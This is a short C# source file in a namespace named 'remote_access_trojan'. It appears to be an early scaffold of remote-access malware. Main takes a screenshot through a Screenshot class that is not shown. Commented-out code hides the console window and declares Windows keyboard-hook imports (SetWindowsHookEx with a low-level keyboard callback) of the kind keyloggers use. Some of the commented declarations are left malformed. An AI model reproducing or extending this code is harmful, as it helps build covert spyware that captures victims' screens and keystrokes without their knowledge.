using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace remote_access_trojan
{
    class Program
    {
        const int SW_HIDE = 0;

        static void Main(string[] args)
        {
            // Hide
            //var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);

            Console.WriteLine("Hello World!");

            Screenshot screenshotManager = new Screenshot();
            screenshotManager.takeScreenshot();
        }

        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr SetWindowsHookEx(int idHook,
        //    LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //[return: MarshalAs(UnmanagedType.Bool)]
        //private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        //    IntPtr wParam, IntPtr lParam);

        //[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr GetModuleHandle(string lpModuleName);

        //[DllImport("kernel32.dll")]

        //[DllImport("user32.dll")]

        //static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        //static extern IntPtr GetConsoleWindow();
    }
}
